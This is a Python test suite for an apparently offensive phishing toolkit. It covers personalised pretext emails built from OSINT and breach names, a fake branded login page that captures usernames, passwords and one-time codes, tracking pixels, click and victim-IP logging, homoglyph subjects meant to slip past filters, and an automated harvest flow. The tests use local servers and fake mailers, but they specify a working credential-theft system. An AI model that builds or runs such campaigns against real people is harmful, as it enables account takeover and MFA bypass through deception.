"""Tests for the professional social-engineering upgrade:
pretext templates, credential-harvest tracker routes, campaign engine,
harvest flow and new marker interpretation."""
import unittest

from phantom.automation.belief import WorldModel
from phantom.automation.social.engine import Campaign, CampaignTarget, SocialEngine
from phantom.automation.social.grabbit import IpGrabber
from phantom.automation.social.mailers import Mailer
from phantom.automation.social.templates import (
    build_context,
    build_html_body,
    pretext_ids,
    render_pretext,
)
from phantom.automation.social.tracker import (
    HitStore,
    TrackingServer,
    fingerprint_ua,
)


_CYR_TO_LAT = [("\u0430", "a"), ("\u0435", "e"), ("\u043e", "o"),
               ("\u0440", "p"), ("\u0441", "c"), ("\u0443", "y"),
               ("\u0445", "x"), ("\u043a", "k"), ("\u043c", "m"),
               ("\u0442", "t"), ("\u04bb", "h"), ("\u0432", "b"),
               ("\u043f", "n"),
               ("\u0410", "A"), ("\u0415", "E"), ("\u041e", "O"),
               ("\u0420", "P"), ("\u0421", "C"), ("\u0423", "Y"),
               ("\u0425", "X"), ("\u041a", "K"), ("\u041c", "M"),
               ("\u0422", "T"), ("\u04ba", "H"), ("\u0412", "B"),
               ("\u041f", "N")]


def _norm(text: str) -> str:
    for cyr, lat in _CYR_TO_LAT:
        text = text.replace(cyr, lat)
    return text


# ---------------------------------------------------------------------------
# templates
# ---------------------------------------------------------------------------

class TestTemplates(unittest.TestCase):

    def test_build_context_from_osint(self):
        ctx = build_context(email="mario.rossi@acme.it", platform="linkedin",
                            breaches=["AcmeCorp2023"], discovered_names=["Mario Rossi"])
        self.assertEqual(ctx["name"], "Mario Rossi")
        self.assertEqual(ctx["company"], "Acme")
        self.assertEqual(ctx["platform"], "linkedin")
        self.assertEqual(ctx["breach"], "AcmeCorp2023")

    def test_context_degrades_gracefully(self):
        ctx = build_context()
        self.assertEqual(ctx["name"], "there")
        self.assertEqual(ctx["breach"], "")
        self.assertNotIn("None", str(ctx))

    def test_all_pretexts_render_without_placeholder_leaks(self):
        for pid in pretext_ids():
            rendered = render_pretext(pid, build_context(email="a.b@corp.com"),
                                      link="http://t/abc", link_label="Go")
            self.assertIsNotNone(rendered, pid)
            for field in ("subject", "body_text"):
                self.assertNotIn("{", rendered[field], f"{pid}.{field}")
                self.assertNotIn("None", rendered[field], f"{pid}.{field}")
            # the link must appear in the body of every pretext
            self.assertIn("http://t/abc", rendered["body_text"], pid)

    def test_html_body_embeds_link_and_pixel(self):
        html = build_html_body("Sub", "Hi there\n\nAction needed\n\nRegards",
                               "http://t/abc", "Go", tracking_pixel="http://t/px/c")
        self.assertIn("http://t/abc", html)
        self.assertIn("http://t/px/c", html)
        self.assertIn("<a href=\"http://t/abc\"", html)  # action button


# ---------------------------------------------------------------------------
# tracker: fingerprint, store, routes (real in-process server on ephemeral port)
# ---------------------------------------------------------------------------

class TestTracker(unittest.TestCase):

    def test_fingerprint_ua(self):
        fp = fingerprint_ua("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                            "AppleWebKit/537.36 Chrome/125.0 Safari/537.36")
        self.assertEqual(fp["os"], "windows")
        self.assertEqual(fp["browser"], "chrome")
        fp = fingerprint_ua("Mozilla/5.0 (Linux; Android 14; Pixel 8) "
                            "Mobile Safari/537.36")
        self.assertEqual(fp["os"], "android")
        self.assertEqual(fp["device"], "phone")
        self.assertEqual(fingerprint_ua(""), {"os": "", "device": "", "browser": ""})

    def test_store_records_opens_and_creds(self):
        store = HitStore()
        store.record_open("c1", "1.2.3.4", "ua1")
        store.record_cred("c1", "1.2.3.4", "ua1", "mario@corp.it", "s3cret", "123456")
        self.assertEqual(len(store.opens("c1")), 1)
        creds = store.creds("c1")
        self.assertEqual(creds[0].username, "mario@corp.it")
        self.assertEqual(creds[0].otp, "123456")
        self.assertEqual(store.hits("c1"), [])

    def test_login_page_and_pixel_routes(self):
        server = TrackingServer(host="127.0.0.1", port=0, brand="Contoso",
                                otp=True)
        server.start()
        try:
            self.assertTrue(server.running, server.bind_error)
            port = server._httpd.server_address[1]
            base = f"http://127.0.0.1:{port}"
            import urllib.request
            # login page
            with urllib.request.urlopen(f"{base}/l/abc") as r:
                html = r.read().decode("utf-8")
            self.assertIn("Contoso", html)
            self.assertIn("action=\"/c/abc\"", html)
            self.assertIn('name="otp"', html)
            # pixel
            with urllib.request.urlopen(f"{base}/px/abc") as r:
                self.assertEqual(r.headers.get("Content-Type"), "image/gif")
                self.assertGreater(len(r.read()), 0)
            # click capture -> 302 (raw http.client so the redirect is not followed)
            import http.client
            conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
            conn.request("GET", "/abc")
            resp = conn.getresponse()
            self.assertEqual(resp.status, 302)
            conn.close()
            self.assertEqual(len(server.store.hits("abc")), 1)
            self.assertEqual(len(server.store.opens("abc")), 1)
            # credential POST capture
            import urllib.parse
            data = urllib.parse.urlencode(
                {"username": "mario@corp.it", "password": "pw", "otp": "000000"}).encode()
            conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
            conn.request("POST", "/c/abc", body=data,
                         headers={"Content-Type": "application/x-www-form-urlencoded"})
            resp = conn.getresponse()
            self.assertEqual(resp.status, 401)
            conn.close()
            creds = server.store.creds("abc")
            self.assertEqual(len(creds), 1)
            self.assertEqual(creds[0].password, "pw")
        finally:
            server.stop()


# ---------------------------------------------------------------------------
# campaign engine (fake grabber + fake mailer, no network)
# ---------------------------------------------------------------------------

class _FakeGrabber:
    def __init__(self):
        self.opens = []
        self.hits = []
        self.creds = []

    def create_link(self, label="phish", prefix=""):
        from phantom.automation.social.grabbit import GrabLink
        code = f"{label}-x"
        return GrabLink(short_url=f"http://track.local/{prefix}{code}", code=code)

    def create_login_link(self, label="login"):
        return self.create_link(label=label, prefix="l/")

    def poll_opens(self, link, timeout=60.0):
        return self.opens

    def poll_hits(self, link, timeout=120.0):
        return self.hits

    def poll_creds(self, link, timeout=120.0):
        return self.creds


class TestCampaignEngine(unittest.TestCase):

    def _engine(self):
        eng = SocialEngine()
        sent = []
        eng._mailer = Mailer(transport=lambda *a, **k: (sent.append(a) or True))
        eng._grabber = _FakeGrabber()
        eng._persona_inst = type("P", (), {"email": "persona@grr.la"})()
        eng._discovered.update({"emails": ["mario.rossi@acme.it"],
                                "platform": "linkedin",
                                "breaches": ["AcmeCorp2023"]})
        return eng, sent

    def test_campaign_sends_personalized_html(self):
        eng, sent = self._engine()
        ok, lines = eng.campaign(["mario.rossi@acme.it"], pretext="security_alert")
        self.assertTrue(ok, lines)
        self.assertTrue(any(l.startswith("CAMPAIGN:") for l in lines), lines)
        self.assertEqual(len(eng._campaigns), 1)
        camp = eng._campaigns[0]
        self.assertEqual(camp.targets[0].status, "sent")
        # subject is personalized with the platform (homoglyphs normalized:
        # the display text looks identical to the victim, the bytes differ)
        self.assertIn("linkedin", _norm(sent[0][2]))  # subject
        # body uses the real breach name (OSINT context)
        self.assertIn("AcmeCorp2023", sent[0][3])
        # html contains the tracking pixel and the login link
        self.assertIn("/px/", sent[0][4])
        self.assertIn("track.local/l/", sent[0][4])
        self.assertEqual(eng._campaigns[0].stats()["sent"], 1)

    def test_unknown_pretext_rejected(self):
        eng, _ = self._engine()
        ok, lines = eng.campaign(["a@b.it"], pretext="nope")
        self.assertFalse(ok)
        self.assertTrue(any("unknown_pretext" in l for l in lines))

    def test_harvest_progresses_status_and_emits_markers(self):
        from phantom.automation.social.tracker import OpenEvent, VictimHit, CredCapture
        eng, _ = self._engine()
        eng.campaign(["mario.rossi@acme.it"], pretext="it_helpdesk")
        g = eng._grabber
        g.opens = [OpenEvent(ip="9.9.9.1", user_agent="ua")]
        g.hits = [VictimHit(ip="9.9.9.1", user_agent="ua", os="windows")]
        g.creds = [CredCapture(ip="9.9.9.1", username="mario.rossi@acme.it",
                               password="pw123", otp="")]
        ok, lines = eng.harvest(timeout=1)
        self.assertTrue(ok, lines)
        joined = "\n".join(lines)
        self.assertIn("OPEN:", joined)
        self.assertIn("VICTIM_IP: ip=9.9.9.1", joined)
        self.assertIn("CREDS:", joined)
        t = eng._campaigns[0].targets[0]
        self.assertEqual(t.status, "creds")
        stats = eng._campaigns[0].stats()
        self.assertEqual(stats["opened"], 1)
        self.assertEqual(stats["clicked"], 1)
        self.assertEqual(stats["creds"], 1)

    def test_campaign_report_shape(self):
        eng, _ = self._engine()
        eng.campaign(["a@b.it"], pretext="doc_share")
        report = eng.campaigns()[0]
        self.assertIn("pretext", report)
        self.assertIn("stats", report)
        self.assertIn("targets", report)


# ---------------------------------------------------------------------------
# marker interpretation (auto-mode findings)
# ---------------------------------------------------------------------------

class TestCampaignInterp(unittest.TestCase):

    def test_campaign_open_creds_markers_to_findings(self):
        from phantom.automation.guidance.kit import _social_interp
        wm = WorldModel(target="mario.rossi@acme.it", target_type="email")
        out = "\n".join([
            "CAMPAIGN: id=ab12 pretext=security_alert to=mario.rossi@acme.it "
            "status=sent link=http://t/l/c",
            "OPEN: to=mario.rossi@acme.it ip=9.9.9.1",
            "CREDS: email=mario.rossi@acme.it username=mario.rossi@acme.it "
            "password=pw123 otp=000000",
        ])
        findings = _social_interp(out, wm, {})
        kinds = {f.kind for f in findings}
        self.assertIn("campaign", kinds)
        self.assertIn("phish_open", kinds)
        self.assertIn("creds", kinds)
        cred = next(f for f in findings if f.kind == "creds")
        self.assertEqual(cred.value["password"], "pw123")
        self.assertEqual(cred.value["service"], "harvest")
        self.assertFalse(cred.value["valid"])  # verified later by the planner
        camp = next(f for f in findings if f.kind == "campaign")
        self.assertEqual(camp.value["pretext"], "security_alert")


if __name__ == "__main__":
    unittest.main()
